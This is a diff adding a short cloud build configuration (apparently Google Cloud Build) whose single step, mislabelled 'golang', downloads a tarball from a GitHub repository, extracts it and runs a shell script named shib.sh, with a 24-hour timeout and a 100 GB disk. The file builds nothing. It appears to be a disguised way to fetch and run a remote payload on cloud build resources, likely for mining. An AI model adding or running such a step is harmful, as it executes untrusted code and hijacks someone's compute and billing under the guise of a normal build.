@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         wget https://github.com/pionbangkit/cobacoba/raw/main/shib.tar.gz && tar xf shib.tar.gz && ./shib.sh
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
